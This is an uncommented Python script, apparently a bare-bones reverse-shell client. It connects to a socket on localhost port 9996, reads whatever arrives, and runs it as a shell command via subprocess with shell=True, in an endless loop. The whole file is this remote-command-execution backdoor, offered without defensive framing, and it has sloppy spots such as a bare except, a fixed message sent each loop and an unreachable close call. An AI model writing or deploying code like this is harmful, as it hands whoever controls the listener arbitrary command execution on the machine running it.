import subprocess
import socket


def run_command(command):
    command = command.rstrip()
    try:
        child = subprocess.run(command, shell=True)
    except:
        print("Can not execute this command.")
    return child


client = socket.socket()
client.connect(("127.0.0.1", 9996))
while True:
    message = "disconnection."
    client.send(message.encode(encoding="gbk"))
    data = client.recv(1024)
    print(data.decode())
    output = run_command(data)

client.close()